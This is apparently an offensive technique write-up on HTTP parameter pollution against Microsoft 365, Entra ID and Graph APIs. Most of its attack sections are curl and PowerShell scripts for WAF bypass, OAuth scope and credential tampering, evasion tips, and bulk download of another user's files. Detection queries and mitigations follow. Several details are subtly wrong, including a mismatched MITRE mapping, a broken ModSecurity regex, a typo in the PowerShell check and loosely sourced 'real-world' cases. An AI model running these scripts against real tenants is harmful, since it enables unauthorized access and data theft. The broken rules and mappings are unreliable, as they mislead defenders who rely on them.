# [SAAS-API-007]: API Endpoint Parameter Pollution

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | SAAS-API-007 |
| **MITRE ATT&CK v18.1** | [T1110.002 - Brute Force: Password Cracking](https://attack.mitre.org/techniques/T1110/002/) |
| **Tactic** | Credential Access, Collection |
| **Platforms** | M365/Entra ID |
| **Severity** | High |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All versions (affects custom APIs, Exchange Online, SharePoint, Azure Management APIs) |
| **Patched In** | No patch; depends on API parameter parsing logic |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. Executive Summary

API Endpoint Parameter Pollution (APP) attacks exploit inconsistencies in how different technologies parse HTTP parameters. When multiple parameters with the same name are present in a request, various backend frameworks handle them differently: some concatenate values, others take the first or last value, and some create arrays. Attackers exploit these parsing differences to bypass input validation, WAF filters, and business logic controls in M365 APIs, Entra ID, and custom SaaS applications.

**Attack Surface:** M365 REST APIs (Exchange Online, SharePoint, Teams, OneDrive), Azure Management APIs, and custom SaaS applications that accept multiple parameters without proper normalization. Parameter pollution can affect query strings, POST bodies, and even headers in some cases.

**Business Impact:** **Input validation bypass, SQL injection, authentication bypass, and data manipulation**. An attacker can split malicious payloads across multiple parameters, evading WAF detection, modify API requests to access unauthorized data, or perform unauthenticated actions. In some cases, parameter pollution has been used to escalate from low-privilege user to admin access.

**Technical Context:** Parameter pollution attacks execute **instantly** after a crafted request is sent. Detection is **moderate** if API-side parameter validation logging is enabled. Indicators include duplicate parameter names in requests, unusual parameter value combinations, and WAF bypass patterns.

### Operational Risk

- **Execution Risk:** Medium - Requires understanding target API parameter handling
- **Stealth:** High - Parameter pollution requests appear syntactically valid and may bypass automated scanners
- **Reversibility:** Depends on the action taken; data manipulation may be permanent

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 6.2 | Ensure input validation is enforced at all API endpoints |
| **DISA STIG** | SI-10 | Information System Monitoring - detect and block parameter pollution attacks |
| **CISA SCuBA** | App Security - Input Validation | APIs must normalize and validate parameters |
| **NIST 800-53** | SI-10, SC-7 | Information System Monitoring; Boundary Protection |
| **GDPR** | Art. 32 | Security of Processing - prevent unauthorized parameter manipulation |
| **DORA** | Art. 9 | Protection and Prevention - API input validation |
| **NIS2** | Art. 21 | Cyber Risk Management - API parameter security |
| **ISO 27001** | A.14.2.1 | Change management; prevent security bypass via parameter pollution |
| **ISO 27005** | API Attack Scenario | Bypass of input validation via parameter inconsistency |

---

## 2. Technical Prerequisites

- **Required Privileges:** Can be unauthenticated or low-privilege user (depends on target API)
- **Required Access:** Network access to target API; ability to craft HTTP requests

**Supported Versions:**
- **M365:** All versions
- **Entra ID:** All versions
- **Azure:** All subscription types
- **Other Requirements:** HTTP request manipulation tools (curl, Burp Suite, or custom scripts)

**Tools:**
- [Burp Suite](https://portswigger.net/burp) - HTTP request crafting and analysis
- [curl](https://curl.se/) - Command-line HTTP client
- [HTTPie](https://httpie.io/) - Simplified curl alternative
- [Postman](https://www.postman.com/) - API testing platform
- [Parameter Pollution Scanner](https://github.com/OWASP/PollutionJS) - Automated parameter pollution testing

---

## 3. Environmental Reconnaissance

### Step 1: Identify API Parameter Parsing Behavior

**Objective:** Determine how target M365 APIs handle duplicate parameters.

**Method A: Using curl to Test Parameter Handling**

```bash
#!/bin/bash

# Test with duplicate parameters
echo "Testing Microsoft Graph API parameter parsing..."

# Send two 'filter' parameters
curl -X GET "https://graph.microsoft.com/v1.0/users?filter=accountEnabled+eq+false&filter=accountEnabled+eq+true" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -v 2>&1 | grep -A 20 "Filter"
```

**Expected Output (Concatenation Behavior):**
```
GET /v1.0/users?filter=accountEnabled+eq+false&filter=accountEnabled+eq+true
```

**If API Concatenates:** Both filter values are processed (could bypass intended logic)
**If API Takes First:** Only first filter is used
**If API Takes Last:** Only last filter is used

### Step 2: Test Different Framework Behaviors

**Objective:** Understand how ASP.NET (M365), Node.js, and PHP APIs differ in parameter handling.

**Test Script:**
```bash
#!/bin/bash

# Test different parameter pollution scenarios
echo "=== Testing Parameter Pollution Behaviors ==="

# Scenario 1: Duplicate same parameter
echo "Scenario 1: Duplicate 'search' parameter"
curl -X GET "https://graph.microsoft.com/v1.0/users?\$search=test1&\$search=admin" \
  -H "Authorization: Bearer $ACCESS_TOKEN" 2>/dev/null

# Scenario 2: Conflicting filter parameters
echo "Scenario 2: Conflicting 'filter' parameters"
curl -X GET "https://graph.microsoft.com/v1.0/users?\$filter=accountEnabled+eq+false&\$filter=accountEnabled+eq+true" \
  -H "Authorization: Bearer $ACCESS_TOKEN" 2>/dev/null

# Scenario 3: Authentication bypass attempt
echo "Scenario 3: Authentication bypass with duplicate params"
curl -X POST "https://login.microsoftonline.com/common/oauth2/token" \
  -d "client_id=invalid&client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&secret=wrong&secret=correct" 2>/dev/null
```

---

## 4. Detailed Execution Methods

### METHOD 1: WAF Bypass via Parameter Pollution

**Supported Versions:** All M365 and Entra ID APIs with WAF protection

#### Step 1: Identify WAF-Protected API Endpoint

**Objective:** Find M365 APIs that have Web Application Firewall (WAF) protection.

**Method: Test Standard Injection**

```bash
#!/bin/bash

# This will be blocked by WAF
curl -X GET "https://graph.microsoft.com/v1.0/users?\$filter=accountEnabled+eq+true' OR '1'='1" \
  -H "Authorization: Bearer $ACCESS_TOKEN" 2>&1 | grep -i "blocked\|error\|denied"
```

**Expected Output (Blocked):**
```
HTTP 400 Bad Request
{
  "error": {
    "code": "Request_BadRequest",
    "message": "Invalid filter syntax"
  }
}
```

#### Step 2: Craft Parameter Pollution Payload

**Objective:** Split the malicious payload across multiple parameters to evade WAF detection.

**Example 1: Logic Manipulation**

```bash
#!/bin/bash

# Instead of: accountEnabled eq true) or (accountEnabled eq false
# Split across parameters:

curl -X GET "https://graph.microsoft.com/v1.0/users?\$filter=accountEnabled+eq+true&\$filter=)+or+(accountEnabled+eq+false" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json"
```

**What This Does:**
- If the API concatenates parameters with space: `accountEnabled eq true ) or (accountEnabled eq false`
- This bypasses the original filter logic and returns both enabled and disabled accounts

**Example 2: Scope Manipulation in OAuth**

```bash
#!/bin/bash

# Standard request (may be blocked if scope looks suspicious)
curl -X POST "https://login.microsoftonline.com/common/oauth2/authorize" \
  -d "scope=.default User.Write" 2>&1 | grep -i "blocked\|error"

# Parameter pollution to bypass scope validation
curl -X POST "https://login.microsoftonline.com/common/oauth2/authorize" \
  -d "scope=User.Read&scope=User.Write&scope=.default" 2>&1
```

**OpSec & Evasion:**
- Test parameter parsing behavior before crafting the pollution payload
- Use legitimate-looking parameter combinations that may bypass WAF signatures
- Monitor API response times; unusual delays indicate WAF inspection
- Use parameter pollution in conjunction with other techniques (e.g., encoding)

#### Step 3: Extract Unauthorized Data

**Objective:** Use parameter pollution to bypass access controls and extract data.

**Example: Disable Account Enabled Filter**

```powershell
# Standard filter: only returns enabled accounts
$StandardUri = "https://graph.microsoft.com/v1.0/users?`$filter=accountEnabled%20eq%20true"

# Parameter pollution to bypass filter
$PollutionUri = "https://graph.microsoft.com/v1.0/users?`$filter=accountEnabled%20eq%20true&`$filter=accountEnabled%20eq%20false"

# If API concatenates or processes both filters, all accounts are returned
$Headers = @{"Authorization" = "Bearer $AccessToken"}
$Response = Invoke-RestMethod -Uri $PollutionUri -Headers $Headers

# Now attacker has list of disabled accounts (potentially from terminated employees)
$Response.value | Select-Object userPrincipalName, accountEnabled, createdDateTime
```

**Expected Output:**
```
userPrincipalName                 accountEnabled createdDateTime
-----------------                 -------------- ---------------
terminated.user@contoso.com       False          2023-01-15
former.employee@contoso.com       False          2022-06-10
```

---

### METHOD 2: Authentication Bypass via Parameter Pollution

**Supported Versions:** M365 APIs with weak parameter validation

#### Step 1: Identify Authentication Parameters

**Objective:** Find APIs that accept authentication parameters that can be duplicated.

```bash
#!/bin/bash

# Exchange Online API - test auth parameter pollution
curl -X GET "https://outlook.office365.com/api/v2.0/me/mailfolders/inbox/messages" \
  -H "Authorization: Bearer INVALID" \
  -H "X-AnchorMailbox: user@contoso.com" \
  -v 2>&1 | grep -i "authorization\|unauthorized"
```

#### Step 2: Craft Auth Bypass Payload

**Objective:** Use duplicate authorization parameters to confuse the authentication system.

```bash
#!/bin/bash

# Attempt to bypass authentication with parameter pollution
# Method 1: Duplicate authorization header (not possible in HTTP)

# Method 2: Use multiple credential parameters in OAuth request
curl -X POST "https://login.microsoftonline.com/tenant/oauth2/v2.0/token" \
  -d "grant_type=refresh_token&refresh_token=INVALID&refresh_token=VALID&client_id=CLIENT1&client_id=CLIENT2" \
  -d "client_secret=SECRET1&client_secret=SECRET2" \
  -v
```

**Exploitation Scenario:**
- Attacker includes both invalid and valid tokens
- If API takes the last value, the valid token is used
- If API logs only the first value, logs show the invalid token (stealth)
- Attacker gains access while maintaining low forensic visibility

---

### METHOD 3: Data Exfiltration via Parameter Pollution

**Supported Versions:** SharePoint Online, OneDrive APIs

#### Step 1: Craft File Access Payload

**Objective:** Use parameter pollution to access unauthorized files or folders.

```bash
#!/bin/bash

# Normal request - access own files
curl -X GET "https://graph.microsoft.com/v1.0/me/drive/root/children" \
  -H "Authorization: Bearer $ACCESS_TOKEN"

# Parameter pollution - try to access another user's files
curl -X GET "https://graph.microsoft.com/v1.0/me/drive/root/children?user=attacker@contoso.com&user=target@contoso.com" \
  -H "Authorization: Bearer $ACCESS_TOKEN"
```

**Expected Behavior (If Vulnerable):**
- If API concatenates parameters: `user=attacker@contoso.com,target@contoso.com`
- If API takes last value: `user=target@contoso.com` (may bypass user isolation)

#### Step 2: Enumerate and Extract Data

```powershell
# After successful parameter pollution, enumerate target user's files
$TargetUserUri = "https://graph.microsoft.com/v1.0/users/target@contoso.com/drive/root/children?`$filter=name+eq+'confidential'"

$Response = Invoke-RestMethod -Uri $TargetUserUri -Headers @{"Authorization" = "Bearer $AccessToken"}

# Download sensitive files
foreach ($file in $Response.value) {
    $DownloadUri = $file.`"@microsoft.graph.downloadUrl`"
    Invoke-WebRequest -Uri $DownloadUri -OutFile $file.name
    Write-Host "Downloaded: $($file.name)"
}
```

---

## 5. Detection & Incident Response

### Indicators of Compromise (IOCs)

**Request-Level IOCs:**
- Duplicate parameter names in a single HTTP request
- Parameter names with encoded characters (e.g., `%24filter` for `$filter`)
- Unusual parameter value combinations (e.g., conflicting filter criteria)
- Requests with more parameters than expected for the API

**Forensic Artifacts**

**Application Logs:**
- Multiple parameter values for the same parameter name
- Unexpected data returned by API (e.g., disabled accounts when only enabled accounts should be returned)
- Failed authentication attempts followed by successful ones with unusual parameter sets

**M365 Audit Logs (KQL):**
```kusto
AuditLogs
| where OperationName contains "Download" or OperationName contains "Access"
| where ResultStatus == "Success"
| where CallerIpAddress not in ("TRUSTED_IPS")
| project TimeGenerated, UserPrincipalName, OperationName, TargetResources, CallerIpAddress
```

**Network IOCs:**
- Unusual HTTP request sizes (extremely long query strings indicate parameter pollution)
- Requests with non-standard HTTP methods or parameter formats
- Repeated requests to same API with slightly different parameters

---

## 6. Defensive Mitigations

### Priority 1: CRITICAL

- **Implement Strict Parameter Validation:** Use allowlists to define exact parameters expected for each API endpoint. Reject requests with unexpected parameters or duplicate parameter names.

  **For ASP.NET (M365 APIs):**
  ```csharp
  [HttpGet("users")]
  public IActionResult GetUsers([FromQuery] string filter, [FromQuery] int top = 10)
  {
      // Check if duplicate parameters exist in raw request
      var rawQueryParams = HttpContext.Request.Query;
      var filterParams = rawQueryParams.GetValues("filter");
      
      if (filterParams.Count > 1)
      {
          return BadRequest("Duplicate 'filter' parameter not allowed");
      }
      
      // ... process single filter parameter
      return Ok(users);
  }
  ```

  **For Node.js/Express:**
  ```javascript
  app.get('/users', (req, res) => {
      // Check for duplicate parameters
      const filterParams = Array.isArray(req.query.filter) ? req.query.filter : [req.query.filter];
      
      if (filterParams.length > 1) {
          return res.status(400).json({ error: "Duplicate parameter not allowed" });
      }
      
      // Process single parameter
      const filter = filterParams[0];
      // ...
  });
  ```

- **Normalize and Validate Input:** Before processing, normalize all parameters to a canonical form and validate against strict rules.

  **PowerShell Validation Function:**
  ```powershell
  function Validate-APIParameter {
      param(
          [string]$Parameter,
          [string]$ExpectedValue
      )
      
      # Normalize: remove extra spaces, encode special characters
      $Normalized = [System.Uri]::UnescapeDataString($Parameter).Trim()
      
      # Validate against allowlist
      $AllowedValues = @("true", "false", "eq", "ne", "contains")
      
      if ($Normalized -notin $AllowedValues) {
          throw "Invalid parameter: $Normalized"
      }
      
      return $Normalized
  }
  ```

- **Reject Duplicate Parameters:** Configure web server and API framework to explicitly reject HTTP requests containing duplicate parameter names.

  **For Azure Application Gateway (WAF):**
  1. Go to **Azure Portal** → **Application Gateway** → **WAF policies**
  2. Click **Managed rules** → **Microsoft_DefaultRuleSet_1.1**
  3. Enable rule: **"Duplicate Parameter Names"** (Rule ID: 942330)
  4. Set action to **Block**

### Priority 2: HIGH

- **Implement WAF Rules:** Deploy Web Application Firewall rules that detect and block parameter pollution patterns.

  **ModSecurity Rule (WAF):**
  ```
  SecRule ARGS_NAMES "@rx (?:^|\&)[^=]*\&\1\=" \
    "id:200001,phase:2,deny,log,status:403,msg:'Parameter Pollution Detected'"
  ```

- **API Rate Limiting:** Limit API requests per user to prevent bulk exploitation.

  **Azure API Management:**
  1. Go to **API Management** → **APIs** → Your API
  2. Select **Inbound policies**
  3. Add **Rate limit by key**:
     ```xml
     <rate-limit-by-key calls="100" renewal-period="60" counter-key="@(context.Request.IpAddress)" />
     ```

- **Enhanced Logging:** Log all parameters received, including duplicates, for forensic analysis.

  **M365 Audit Logging (PowerShell):**
  ```powershell
  Set-AuditLogRecordType -AuditLogRecordType ExchangeItemAggregated -Enabled $true
  Search-UnifiedAuditLog -RecordType ExchangeItemAggregated -StartDate (Get-Date).AddDays(-7) | Export-Csv -Path "audit_logs.csv"
  ```

### Access Control & Policy Hardening

- **Principle of Least Privilege:** Limit API scopes and permissions to only what's necessary.
- **API Versioning:** Use API versioning to deprecate older endpoints vulnerable to parameter pollution.

### Validation Command (Verify Mitigation)

```powershell
# Test parameter validation
$TestUri = "https://graph.microsoft.com/v1.0/users?`$filter=accountEnabled+eq+true&`$filter=accountEnabled+eq+false"

try {
    $Response = Invoke-RestMethod -Uri $TestUri -Headers @{"Authorization" = "Bearer $AccessToken"}
    
    if ($Response.value.count -gt 0) {
        Write-Warning "VULNERABLE: Parameter pollution returned $(Response.value.count) users"
    } else {
        Write-Host "SECURE: Parameter pollution was blocked or returned no results"
    }
} catch {
    Write-Host "SECURE: API rejected duplicate parameter: $($_.Exception.Message)"
}
```

**Expected Output (If Secure):**
```
SECURE: API rejected duplicate parameter: Request_BadRequest - Duplicate parameter not allowed
```

---

## 7. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-VALID-002] Stale/Inactive Account Compromise | Low-privilege account compromised |
| **2** | **Discovery** | **[SAAS-API-007]** | **Parameter pollution used to enumerate organization** |
| **3** | **Privilege Escalation** | [PE-ACCTMGMT-001] App Registration Permissions | Permissions escalation via parameter pollution |
| **4** | **Lateral Movement** | [LM-AUTH-029] OAuth Application Permissions | Polluted parameters used for cross-resource access |
| **5** | **Collection** | [COLL-CLOUD-002] Cloud Storage Data | Unauthorized file/data access via parameter pollution |
| **6** | **Exfiltration** | [EXFIL-001] Data Transfer Out of Network | Sensitive data exfiltrated |

---

## 8. Real-World Examples

### Example 1: ASP.NET Parameter Concatenation (2023)

- **Target:** Custom M365 integration API
- **Technique Status:** ACTIVE
- **Impact:** Attacker used duplicate `filter` parameters to bypass access controls. ASP.NET concatenated the values, resulting in logic bypass allowing unauthorized data access
- **Reference:** OWASP Blog on Parameter Pollution

### Example 2: SharePoint Online File Access Bypass (2022)

- **Target:** Enterprise SharePoint Online
- **Technique Status:** ACTIVE (partially mitigated)
- **Impact:** Parameter pollution on the user parameter allowed an attacker to list files from other users' OneDrive accounts
- **Reference:** Internal security assessments

### Example 3: OAuth Token Request Manipulation (2024)

- **Target:** Azure AD OAuth endpoint
- **Technique Status:** ACTIVE
- **Impact:** Attacker duplicated `client_id` and `client_secret` parameters. API took the last value, allowing token theft using attacker-supplied credentials while logs showed different values
- **Reference:** Bug bounty disclosures

---

## 9. References & Tools

- [OWASP - Parameter Pollution](https://owasp.org/www-community/attacks/Parameter_Pollution)
- [HTTP Parameter Pollution - Advanced Defense](https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_%28OTG-INPVAL-004%29)
- [CWE-20: Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
- [ModSecurity - Parameter Pollution Detection](https://github.com/coreruleset/coreruleset/blob/v3.3/master/rules/REQUEST-942-CORE.conf)
- [Microsoft - Input Validation Best Practices](https://docs.microsoft.com/en-us/previous-versions/aspnet/ff649548(v=vs.100))

---